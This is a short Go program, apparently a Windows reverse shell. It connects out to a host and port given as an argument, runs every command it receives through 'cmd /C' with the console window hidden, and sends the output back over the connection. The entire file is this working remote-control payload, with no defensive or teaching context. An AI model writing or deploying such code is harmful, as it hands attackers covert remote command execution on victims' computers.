package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide a host:port string")
		return
	}

	CONNECT := arguments[1]
	conn, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		if message == "quit" {
			fmt.Print("Over")
			conn.Close()
		}
		fmt.Print("->: " + message)

		cmd := exec.Command("cmd", "/C", message[:len(message)-1])
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		str := string(out)
		singleLineStr := strings.ReplaceAll(str, "\n", " ")
		fmt.Print(singleLineStr)
		conn.Write([]byte(str))
	}
}
